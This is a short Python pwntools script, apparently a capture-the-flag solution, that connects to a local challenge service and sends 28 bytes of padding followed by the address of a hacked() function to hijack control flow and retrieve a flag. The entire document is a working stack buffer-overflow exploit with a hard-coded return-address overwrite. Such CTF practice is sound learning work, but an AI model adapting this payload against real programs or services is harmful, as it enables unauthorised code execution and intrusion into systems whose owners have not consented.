#!/bin/python3

from pwn import *

io = remote("0.0.0.0", 19303)

padding = 28

payload = flat(
    b'A' * padding,
    0x080491a6  #hacked()
)

# Send the payload
io.sendlineafter(b':', payload)

io.recvline()
io.recvline()

try: print(io.recvline().decode())
except: print("No ha devuelto la flag :(")

io.close()
